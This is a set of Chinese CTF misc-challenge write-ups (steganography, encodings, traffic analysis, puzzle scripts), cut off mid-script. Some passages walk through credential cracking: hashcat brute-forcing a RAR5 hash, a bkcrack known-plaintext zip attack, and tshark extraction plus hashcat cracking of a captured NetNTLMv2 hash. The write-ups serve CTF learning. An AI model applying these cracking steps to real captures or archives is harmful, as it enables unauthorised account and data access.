5ZZncZ5cd8j85GW5nj=WWncn55Gj5nj5nwnW58jG8GcnjZdWcl8wj8n=cj=8l8cn5jjcjn8lldn=Gjw8=cjcdWWjGddZljdjdZnG8djnZccZldlWllw5ZZ8wj5Gn==5w8Z=j55n=ZZ5wdww8lndwd8Wlj8WGjnl=nncZ=W8ZZWZnjjlwWGZZlZc5c==d8Zl855wZn=W=w8wWjZ85cGc==5Z8ccjdw5GnZWnGjcdGGnZ5wwwWGG5d=W5ldjwGZZdZwdG5cGGnZGlGc=W5ccWZ8=cGljdGcdld=8cj8jwn=lj88ZZ5jn5lcZ=Gdw=Zl58WZZl5ccwccwG5d5w8Z5wllj5ddnn=5=w8588WwGj=l5G55dWG8cl=GcjWwlwG=lWWnZ=dZG85Gcjc5=wnw=j==Gndnddjwn5c=c5W5wwdWlG5nWZwnGw8=lcWldcwnG5Wcjj=cWlGZc8Gn58ZWjZ85ljlncZj5cc=dZWGjd=d8ncZ8www55=cw=GWZn5ZZlnWld=cWcnclWlZG5djGW=cl8=ZG8cZwwc8wl=88W5ZwZ=jwZGGlcWcWnZZ5Zj5w5ZdZclZZWnccGw==cG8W8ZWlc8wcZ555Z85ljWG5jZ=8=wllWjWjlZc5lG8cwWlnjlGlW=l5=n=lGwnjGGjGdwj85ddW5ZwZ=ddjWldj=cjljjGwndZjWWZGcdWcZW5cdldj8WZjGljlWncZ5=8jnZWjl8wjZG5Zwlcl5dd

统计字频后得到：ZW5jcnlwdG8&#x3D;
解密后：encrypto
百度一下发现这是一个加密软件，需要密钥，看另一个文件。-
sublime打开lookatme看到


莫斯密码：*.- ..- - --- -.- . -.--*
解密之后是AUTOKEY
用breakautokey解密一下


得到密码：iamthepasswd
拿去解密，注意secret文件要加扩展名“crypto”才能解密，否则是加密。
跑了很久没有结果，010打开文件看看


把这个删掉之后再试就能打开了
得到一张彩虹图片
foremost分离出一个zip，需要密码。
密码就是这张图片提取颜色然后转ascii
颜色：
ffff70ffff40ffff73ffff73ffff57ffff64

得到：
704073735764 

转ascii——p@ssWd
解压看到


这个是ALPHUCK——一种怪异的编程语言
在线网站： alphuck在线运行,在线工具，在线编译IDE_w3cschool转化得到flag
flag：flag{1t’s_v3ry_De1iCi0us~!}
190.[NPUCTF2020]签到666这是签到题吗
wp视频： [NPUCTF2020]签到_哔哩哔哩_bilibili
得到一堆文件，是mc的存档文件
这个必须要用mc的1.15.2打开


点开之后一闪一闪的，长亮是1，短亮是0
然后二进制转ascii，ascii包上md5就行
flag：flag{8F108D05D23041B5866F9CB2FF109661}
191.[BSidesSF2020]barcoder条形码修复
可以把这个截图截屏截出来，然后因为每一条竖线都有，补齐就行。
小心一点
官方条形码：


flag：flag{way_too_common}
192.[NewStarCTF 公开赛赛道]最后的流量分析导出http流量
发现有sql注入相关内容
点开一个看一下，发现在干扰的sql注入之中都包含这条内容不存在哦的内容


全部导出http流
使用everything把这些干扰的都筛掉


之后就可以看到flag了


手提一下也很快，嫌慢就脚本
其实这题应该是盲注，不介意的话也可以直接在wireshark里判断flag（根据字母顺序等判断）
flag：flag{c84bb04a-8663-4ee2-9449-349f1ee83e11}
193.[INSHack2018]Spreadshit又是表格题。
打开表格什么都没看到，猜测是填写了空格，查找空格，用黑色单元格填充


就能看到flag了
flag：flag{3cf6463910edffb0}
194.[GKCTF 2021]0.03ntfs扫一下这个txt，得到了一个
QAZ WSX EDCRFV TGB YHNUJM IKO LP/

三分密码
结合原本的311223313313112122312312313311
得到密文： EBCCAFDDCE
用这个密钥来vera挂载那个磁盘，得到flag
flag：flag{85ec0e23-ebbe-4fa7-9c8c-e8b743d0d85c}
195.[羊城杯 2020]image_rar解压得到一段MP4
binwalk提取一下，看到有一个65.jpg打不开


010发现其实是rar文件，修改一下文件头
然后我们rar2john一下
1.rar:$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f

然后我们hashcat爆破一下
在kali里hash值要加引号：hashcat -m 13000 -a 3 &#x27;$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f&#x27; GW?a?a?a?a在windows里不需要加引号：hashcat.exe -m 13000 -a 3 $rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f GW?a?a?a?a

得到密码：GW5!3#
解压之后有一个flag文件，发现是png
最后得到flag GWHT{R3fresh_1s_so_Cool}
flag：flag{R3fresh_1s_so_Cool}
196.[XMAN2018排位赛]ppap追踪tcp流量看到


复制下来cyberchef解码得到一张图片
foremost得到压缩包
没密码，在流量里又发现


发现是xml文件，开头
&lt;opencv_storage&gt;

是人脸识别信息
安装库
pip install opencv-python

安装失败的话建议升级一下python版本
脚本
#python脚本import osimport sysimport cv2 #cv2模块需要自行安装# Get all of the picturesimgs = os.listdir(&#x27;jpg&#x27;) #&#x27;jpg&#x27;为分离出来的图片文件夹# Cascade we&#x27;ll be using for detectioncascade = cv2.CascadeClassifier(&#x27;123.xml&#x27;) #&#x27;123.xml&#x27;保存的123.xml文件# From the cluesscaling_factor = 1.02min_neighbors = 65  # Bumped this up until one pic was leftfor img_name in imgs:    # Load the image and run the cascade    img = cv2.imread(os.path.join(&#x27;jpg&#x27;, img_name)) #&#x27;jpg&#x27;为分离出来的图片文件夹    # print img    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)    if len(detect) &gt; 0:        print(&#x27;ok&#x27;)        for (x, y, w, h) in detect:            # X marks the spot!            cv2.line(img, (x, y),     (x + w, y + h), (255, 0, 0), 2)            cv2.line(img, (x, y + h), (x + w, y),     (255, 0, 0), 2)        # Save the new image        cv2.imwrite(os.path.join(&#x27;123&#x27;, img_name), img) # &#x27;123&#x27;为新建的空文件夹&#x27;&#x27;&#x27;  函数介绍： 参数1：image--待检测图片，一般为灰度图像加快检测速度； 参数2：objects--被检测物体的矩形框向量组；参数3：scaleFactor--表示在前后两次相继的扫描中，搜索窗口的比例系数。        默认为1.1即每次搜索窗口依次扩大10%;参数4：minNeighbors--表示构成检测目标的相邻矩形的最小个数(默认为3个)。        如果组成检测目标的小矩形的个数和小于 min_neighbors - 1 都会被排除。        如果min_neighbors 为 0, 则函数不做任何操作就返回所有的被检候选矩形框，        这种设定值一般用在用户自定义对检测结果的组合程序上；参数5：flags--要么使用默认值，要么使用CV_HAAR_DO_CANNY_PRUNING，如果设置为        CV_HAAR_DO_CANNY_PRUNING，那么函数将会使用Canny边缘检测来排除边缘过多或过少的区域        因此这些区域通常不会是人脸所在区域；参数6、7：minSize和maxSize用来限制得到的目标区域的范围。&#x27;&#x27;&#x27;

记得要把前面foremost分离出来的那些图片放在同目录下的jpg文件夹下。xml改名叫123.xml
得到一张图片


是一个海盗图片，根据海盗的英文猜测压缩包密码是：skullandcrossbones
得到flag
flag：flag{b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3}
197.[QCTF2018]picture题目描述
Just misc it hint：注意文件名（非hash部分） 原文件名：bd4408a3-9835-4962-a9af-6acf6cc56b26.wwjkwywq-2a7c8b1b70e00a010c92cab0394c6f93

没有后缀名，改名为png
猜测是lsb隐写，密码为：wwjkwywq
python2 lsb.py extract attachment.png attachment.txt wwjkwywq

然后就能看到这个attament.txt
这个是des加密的脚本，原脚本网上也能找到
解密脚本：
# _*_ coding:utf-8 _*_ ip = (58, 50, 42, 34, 26, 18, 10, 2,       60, 52, 44, 36, 28, 20, 12, 4,       62, 54, 46, 38, 30, 22, 14, 6,       64, 56, 48, 40, 32, 24, 16, 8,       57, 49, 41, 33, 25, 17, 9, 1,       59, 51, 43, 35, 27, 19, 11, 3,       61, 53, 45, 37, 29, 21, 13, 5,       63, 55, 47, 39, 31, 23, 15, 7) ip_1 = (40, 8, 48, 16, 56, 24, 64, 32,         39, 7, 47, 15, 55, 23, 63, 31,         38, 6, 46, 14, 54, 22, 62, 30,         37, 5, 45, 13, 53, 21, 61, 29,         36, 4, 44, 12, 52, 20, 60, 28,         35, 3, 43, 11, 51, 19, 59, 27,         34, 2, 42, 10, 50, 18, 58, 26,         33, 1, 41, 9, 49, 17, 57, 25) e = (32, 1, 2, 3, 4, 5, 4, 5,      6, 7, 8, 9, 8, 9, 10, 11,      12, 13, 12, 13, 14, 15, 16, 17,      16, 17, 18, 19, 20, 21, 20, 21,      22, 23, 24, 25, 24, 25, 26, 27,      28, 29, 28, 29, 30, 31, 32, 1) p = (16, 7, 20, 21, 29, 12, 28, 17,      1, 15, 23, 26, 5, 18, 31, 10,      2, 8, 24, 14, 32, 27, 3, 9,      19, 13, 30, 6, 22, 11, 4, 25) s = [[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],       [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],       [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],       [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]],      [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],       [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],       [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],       [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]],      [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],       [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],       [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],       [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]],      [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],       [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],       [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],       [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]],      [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],       [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],       [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],       [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]],      [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],       [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],       [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],       [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]],      [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],       [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],       [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],       [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]],      [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],       [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],       [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],       [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]] pc1 = (57, 49, 41, 33, 25, 17, 9,        1, 58, 50, 42, 34, 26, 18,        10, 2, 59, 51, 43, 35, 27,        19, 11, 3, 60, 52, 44, 36,        63, 55, 47, 39, 31, 23, 15,        7, 62, 54, 46, 38, 30, 22,        14, 6, 61, 53, 45, 37, 29,        21, 13, 5, 28, 20, 12, 4) pc2 = (14, 17, 11, 24, 1, 5, 3, 28,        15, 6, 21, 10, 23, 19, 12, 4,        26, 8, 16, 7, 27, 20, 13, 2,        41, 52, 31, 37, 47, 55, 30, 40,        51, 45, 33, 48, 44, 49, 39, 56,        34, 53, 46, 42, 50, 36, 29, 32) d = (1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1) __all__ = [&#x27;desdecode&#x27;]  class DES:    &quot;&quot;&quot;解密函数，DES加密与解密的方法相差不大        只是在解密的时候所用的子密钥与加密的子密钥相反    &quot;&quot;&quot;     def __init__(self):        pass     def decode(self, string, key, key_len, string_len):        output = &quot;&quot;        num = 0        # 将密文转换为二进制        code_string = self._functionCharToA(string, string_len)        # 获取字密钥        code_key = self._getkey(key, key_len)         # 如果密钥长度不是16的整数倍则以增加0的方式变为16的整数倍        real_len = (key_len / 16) + 1 if key_len % 16 != 0 else key_len / 16        trun_len = string_len * 4        # 对每64位进行一次加密        for i in range(0, trun_len, 64):            run_code = code_string[i:i + 64]            run_key = code_key[int(num % real_len)]             # 64位明文初始置换            run_code = self._codefirstchange(run_code)             # 16次迭代            for j in range(16):                code_r = run_code[32:64]                code_l = run_code[0:32]                 # 64左右交换                run_code = code_r                 # 右边32位扩展置换                code_r = self._functionE(code_r)                 # 获取本轮子密钥                key_y = run_key[15 - j]                 # 异或                code_r = self._codeyihuo(code_r, key_y)                 # S盒代替/选择                code_r = self._functionS(code_r)                 # P转换                code_r = self._functionP(code_r)                 # 异或                code_r = self._codeyihuo(code_l, code_r)                 run_code += code_r            num += 1             # 32互换            code_r = run_code[32:64]            code_l = run_code[0:32]            run_code = code_r + code_l             # 将二进制转换为16进制、逆初始置换            output += self._functionCodeChange(run_code)        return output     # 获取子密钥    def _getkey(self, key, key_len):         # 将密钥转换为二进制        code_key = self._functionCharToA(key, key_len)         a = [&#x27;&#x27;] * 16        real_len = (key_len / 16) * 16 + 16 if key_len % 16 != 0 else key_len         b = [&#x27;&#x27;] * int(real_len / 16)        for i in range(int(real_len / 16)):            b[i] = a[:]        num = 0        trun_len = 4 * key_len        for i in range(0, trun_len, 64):            run_key = code_key[i:i + 64]            run_key = self._keyfirstchange(run_key)            for j in range(16):                key_l = run_key[0:28]                key_r = run_key[28:56]                key_l = key_l[d[j]:28] + key_l[0:d[j]]                key_r = key_r[d[j]:28] + key_r[0:d[j]]                run_key = key_l + key_r                key_y = self._functionKeySecondChange(run_key)                b[num][j] = key_y[:]            num += 1         return b         # 异或     def _codeyihuo(self, code, key):        code_len = len(key)        return_list = &#x27;&#x27;        for i in range(code_len):            if code[i] == key[i]:                return_list += &#x27;0&#x27;            else:                return_list += &#x27;1&#x27;        return return_list     # 密文或明文初始置换    def _codefirstchange(self, code):        changed_code = &#x27;&#x27;        for i in range(64):            changed_code += code[ip[i] - 1]        return changed_code     # 密钥初始置换    def _keyfirstchange(self, key):        changed_key = &#x27;&#x27;        for i in range(56):            changed_key += key[pc1[i] - 1]        return changed_key     # 逆初始置换    def _functionCodeChange(self, code):        return_list = &#x27;&#x27;        for i in range(16):            list = &#x27;&#x27;            for j in range(4):                list += code[ip_1[i * 4 + j] - 1]            return_list += &quot;%x&quot; % int(list, 2)        return return_list     # 扩展置换    def _functionE(self, code):        return_list = &#x27;&#x27;        for i in range(48):            return_list += code[e[i] - 1]        return return_list         # 置换P     def _functionP(self, code):        return_list = &#x27;&#x27;        for i in range(32):            return_list += code[p[i] - 1]        return return_list     # S盒代替选择置换    def _functionS(self, key):        return_list = &#x27;&#x27;        for i in range(8):            row = int(str(key[i * 6]) + str(key[i * 6 + 5]), 2)            raw = int(str(key[i * 6 + 1]) + str(key[i * 6 + 2]) + str(key[i * 6 + 3]) + str(key[i * 6 + 4]), 2)            return_list += self._functionTos(s[i][row][raw], 4)         return return_list     # 密钥置换选择2    def _functionKeySecondChange(self, key):        return_list = &#x27;&#x27;        for i in range(48):            return_list += key[pc2[i] - 1]        return return_list     # 将十六进制转换为二进制字符串    def _functionCharToA(self, code, lens):        return_code = &#x27;&#x27;        lens = lens % 16        for key in code:            code_ord = int(key, 16)            return_code += self._functionTos(code_ord, 4)         if lens != 0:            return_code += &#x27;0&#x27; * (16 - lens) * 4        return return_code     # 二进制转换    def _functionTos(self, o, lens):        return_code = &#x27;&#x27;        for i in range(lens):            return_code = str(o &gt;&gt; i &amp; 1) + return_code        return return_code  # 将unicode字符转换为16进制def tohex(string):    return_string = &#x27;&#x27;    for i in string:        return_string += &quot;%02x&quot; % ord(i)    return return_string  def tounicode(string):    return_string = &#x27;&#x27;    string_len = len(string)    for i in range(0, string_len, 2):        return_string += chr(int(string[i:i + 2], 16))    return return_string  # 入口函数def desdecode(from_code, key):    key = tohex(key)     des = DES()     key_len = len(key)    string_len = len(from_code)    if string_len % 16 != 0:        return False    if string_len &lt; 1 or key_len &lt; 1:        return False     key_code = des.decode(from_code, key, key_len, string_len)    return tounicode(key_code)  # 测试if __name__ == &#x27;__main__&#x27;:    print(desdecode(&#x27;e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72&#x27;, &#x27;mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf&#x27;))

得到flag
flag：flag{eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4}
2.2024浙江省赛复现1.real signin得到一张out.png，用zsteg跑一下发现：


得到
dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc

和
ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/

猜测是换表的base64，解密得到flag：DASCTF{We1C0me_2_ZJCTF2024!}
2.机密文档得到一个加密的压缩包，发现加密方式是store，猜测为明文攻击



[!NOTE]
将一个名为flag.txt的文件打包成ZIP压缩包后，发现文件名称会出现在压缩包文件头中，且偏移固定为30
且默认情况下，flag.zip也会作为该压缩包的名称
已知的明文片段有：
“flag.txt” 8个字节，偏移30
ZIP本身文件头：50 4B 03 04 ，4字节
满足12字节的要求

其中 -C 后面跟的是原本的zip，-c 后面跟的是里面需要解密出来的zip，-x 后面是已知的明文，30 表示偏移量，7468655F7365637265745F796F755F6E657665725F657665725F6B6E6F775F6861686168616861是the_secret_you_never_ever_know_hahahaha的16进制转换，即用010打开后看到的。下一个 -x 0 是zip的偏移量，504B0304是zip的16进制表示。
 可以看到解压出来的keys是
b8edf1ff c1f93a7e f93d08e0

得到三段密钥就可以修改压缩包密码了：
![2024-12-08 141849](.&#x2F;Misc-Record&#x2F;2024-12-08 141849.png)
修改了密码为123
解压后得到一个docm文档，猜测是跟宏有关的，wps打开发现


这里可以使用wps里查看宏，也可以olevba看
wps 里查看如下：


olevba 查看如下：


反正最后得到如下宏代码：
Sub key()    Dim decValues As Variant    Dim str As String    Dim result As String    Dim i As Integer    Dim xorValue As Integer        decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)    str = &quot;outguess&quot;    result = &quot;&quot;    For i = LBound(decValues) To UBound(decValues)        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))        result = result &amp; Chr(xorValue)    Next iEnd Sub

可以发现是一个异或代码，可以手搓脚本解密，也可以cyberchef
cyberchef得到如下：


ulhged98BhgVHYp

由于之前提示了是outguess加密，将docm后缀改为zip后在 word &#x2F; media 里拿到图片 image1.jpeg
由于outguess不认识jpeg，需要我们修改后缀名为jpg
![2024-12-08 144645](.&#x2F;Misc-Record&#x2F;2024-12-08 144645.png)
得到flag：DASCTF{B1g_S3CR3t_F0R_Y0u}
3.EZtraffic拿到流量分析一下就可以在SMB里发现有传输流量包，导出一下


发现有三个压缩包，但是只有其中一个是final_out，即最后的zip
这里最好不要用foremost和binwalk，因为你会发现导出的压缩包里面会少东西。
打开压缩包发现


注释
NTLM v2 plaintext + \d&#123;5&#125;

这里后来才知道需要提取 NTLMv2 哈希值并破解，可以看lunatic师傅的博客 这里
而且这里 + \d{5} 提示后面再跟五位数字爆破。
这里可以用tshark导出（tshark是kali自带的）
tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid

得到


这里我们需要的是username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response并且需要以这个形式保存到txt里
rockyou #usernameMicrosoftAccount #domaindb12ced50faf52f141636e80205e8f28 #ServerChallenge66aa2c3634e34e6e330949b82d4d2a64 #NTproofstring而modifiedntlmv2response需要我们回到流量里找一下

先过滤
ntlmssp

可以看到很多流,其中有一个是NTLMSSP_AUTH的
在里面找NTLMv2 Response，可以看到


除了NTProofStr以外的就是我们要找的modifiedntlmv2response了（注意这里复制hex值）
最后得到
rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000

将以上的内容保存到hash.txt中，用hashcat爆破，命令
.\hashcat -m 5600 hash.txt rockyou.txt# 5600 表示NetNTLMv2模式# rockyou是github上找的字典，还挺大



得到密码
haticehatice

接下来就是5位掩码爆破了，ARP秒出


得到密码haticehatice12580，解压压缩包，看到有100张图片碎片，猜测是拼图


猜测图片应该是有顺序的，不然也太难拼了
在stegsolve的rad0里看到


QCR扫一下，看到


这里需要我们按照顺序一个个的把图片更改一下
利用脚本拼接一下（脚本抄的。）
from PIL import Imagefrom pyzbar.pyzbar import decodeimport osdef extract_lsb(imgname):    r = []    img = Image.open(imgname)    width,height = img.size    for x in range(width):        for y in range(height):            pixel = img.getpixel((x,y))            r.append(str(pixel[0] &amp; 1))            # print(pixel)    bin_data = &#x27;&#x27;.join(r)    return bin_data              def bin2img(bin_data):    imgname = &quot;tmp.png&quot;    pixels = []    img = Image.new(&quot;RGB&quot;,(50,50))    for item in bin_data:        if item ==&#x27;0&#x27;:            pixels.append((0,0,0))        else :            pixels.append((255,255,255))    img.putdata(pixels)    # img.show()    img = img.resize((500,500))     # 这里调整一下图片的大小，便于后面pyzbar的识别    img.save(imgname)    return imgname        def read_qrcode(imgname):    img = Image.open(imgname)    decode_data = decode(img)    # print(decode_data)    res = decode_data[0].data.decode()    os.remove(imgname)    return res        def rename_img():    filenames = os.listdir(&quot;./final_out&quot;)    for filename in filenames:        try:            src_img = &quot;./final_out/&quot;+filename            bin_data = extract_lsb(src_img)            imgname = bin2img(bin_data)            res = read_qrcode(imgname)            dst_img = f&quot;./final_out/&#123;res&#125;.png&quot;            os.rename(src_img,dst_img)            print(f&quot;[+] &#123;src_img&#125; ===&gt; &#123;dst_img&#125; down!!!&quot;)        except:            print(f&quot;[-] &#123;src_img&#125; Error!!!&quot;)def merge_img():    cols = 10    rows = 10    img_list = []    new_img = Image.new(&quot;RGB&quot;,(500,500))        for i in range(1,101):        img = Image.open(f&quot;./final_out/&#123;i&#125;.png&quot;)        img_list.append(img)            for y in range(rows):        for x in range(cols):            idx = y * cols + x            img = img_list[idx]            x_offset = x * 50            y_offset = y * 50            new_img.paste(img,(x_offset,y_offset))                # new_img.show()    new_img.save(&quot;flag.png&quot;)        if __name__ == &quot;__main__&quot;:    # rename_img()    merge_img()

最后得到




4.FinalSign文章能看到的：
2c243f2f3b3114345d0a0909333f06100143023b2c55020912

可以发现文章里有雪隐写，里面隐写了xor的密码:


接下来cyberchef就能出了




5.非黑即白得到一个没有后缀的文件，010打开发现是逆序的gif
利用puzzlesolver逆序回来，得到gif，再拆分一下发现全是黑白图片：


这里应该是二进制，脚本提取一下（脚本借鉴的。。）:
import hashlibfrom PIL import Imageflag = &#x27;&#x27;hash_lst = &#123;&#125;pixel_list = &#123;&#125;data_list = &quot;&quot;for i in range(1536):    filename = f&quot;&#123;i&#125;.png&quot;    tmp_img = Image.open(filename)    tmp_pixel = tmp_img.getpixel((0,0))[0]    # print(tmp_pixel)    if tmp_pixel &lt; 200:        data_list += &#x27;0&#x27;    else:        data_list += &#x27;1&#x27;print(data_list) 

这个需要放在文件同目录下，得到
010100000100101100000011000001000001010000000000000000010000000000000000000000001110101101011000010110010101100110011101110010111100011110011010001010100000000000000000000000000001111000000000000000000000000000001000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010011110111100011000101111101011100101100011111010111101011001110111011111100000011011000010010111010010100010101110011110000101000000001011101110000101101101111111111010011001000001111111101001010100111110011110011101001100011011000001110111001110001011101111111101100000110101011010110101110101100001001100000100010101011010111100001000001010000010010110000000100000010001111110000000000010100000000000000000100000000000000000000000011101011010110000101100101011001100111011100101111000111100110100010101000000000000000000000000000011110000000000000000000000000000010000000000000100100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010000001010000000000010000000000000000000000000000000000000000000000000000100000000000110000000000001011000011101010101010000000001100010110010011011011011000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000010010110000010100000110000000000000000000000000000000000000000100000000000000010000000001011010000000000000000000000000010100000000000000000000000000000000000000000000

放在cyberchef里可以看到是一个压缩包，下载下来


gif的帧间隔里隐藏了密码


要删除最后一个0，使用 cyberchef 转 ascii 码得到：


用密码解压zip得到flag：DASCTF{H3r3_1s_C0L0rful_W0rld}
6.天命人得到zip里面是6个文件，解压之后用010打开发现是一个zip打乱了顺序分成了6个
脚本使其重新成为一个zip：（这里需要我们手动重命名顺序）
with open(&quot;1&quot;,&quot;rb&quot;) as f:    data1 = f.read()with open(&quot;2&quot;,&quot;rb&quot;) as f:    data2 = f.read()with open(&quot;3&quot;,&quot;rb&quot;) as f:    data3 = f.read()with open(&quot;4&quot;,&quot;rb&quot;) as f:    data4 = f.read()with open(&quot;5&quot;,&quot;rb&quot;) as f:    data5 = f.read()with open(&quot;6&quot;,&quot;rb&quot;) as f:    data6 = f.read()print(len(data1))print(len(data2))print(len(data3))print(len(data4))print(len(data5))print(len(data6))res = []for i in range(387797):    try:        res.append(data1[i])        res.append(data2[i])        res.append(data3[i])        res.append(data4[i])        res.append(data5[i])        res.append(data6[i])    except:        passprint(len(res))with open(&quot;1.zip&quot;,&quot;wb&quot;) as f:    f.write(bytes(res))

得到一个zip，解压出来是两个有密码的zip文件


可以发现根器里面的txt很小，只有4字节，利用crc爆破一下（注意要重命名，不能出现中文


得到：C0M3_4ND_Get_S1X_R00TS!!
解压未竟zip，发现金箍棒图片是要我们手提像素点，利用脚本
import osimport reimport cv2import argparseimport itertoolsimport numpy as npparser = argparse.ArgumentParser()parser.add_argument(&#x27;-f&#x27;, type=str, default=None, required=True,                    help=&#x27;输入文件名称&#x27;)parser.add_argument(&#x27;-p&#x27;, type=str, default=None, required=True,                    help=&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;)parser.add_argument(&#x27;-n&#x27;, type=str, default=None, required=True,                    help=&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;)parser.add_argument(&#x27;-size&#x27;, type=str, default=&#x27;1x1&#x27;, required=False,                    help=&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;)parser.add_argument(&#x27;-resize&#x27;, type=int, default=1, required=False,                    help=&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;)args  = parser.parse_args()if __name__ == &#x27;__main__&#x27;:    if re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.p) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.n) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.size):        x1, y1 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[0].split(&quot;x&quot;))        x2, y2 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[1].split(&quot;x&quot;))        width, height = map(lambda x: int(x), args.n.split(&quot;x&quot;))        width_size, height_size = map(lambda x: int(x), args.size.split(&quot;x&quot;))        img_path = os.path.abspath(args.f)        file_name = img_path.split(&quot;\\&quot;)[-1]        img = cv2.imread(img_path, cv2.IMREAD_COLOR)        row, col = img.shape[:2]        r, c = len(range(y1, y2 + 1, height)), len(range(x1, x2 + 1, width))        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, 3))        for y, x in itertools.product(range(r), range(c)):            for y_size in range(height_size):                for x_size in range(width_size):                    # new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-1)                    # cv2.imshow(new_img)        cv2.imwrite(f&quot;_&#123;file_name&#125;&quot;, 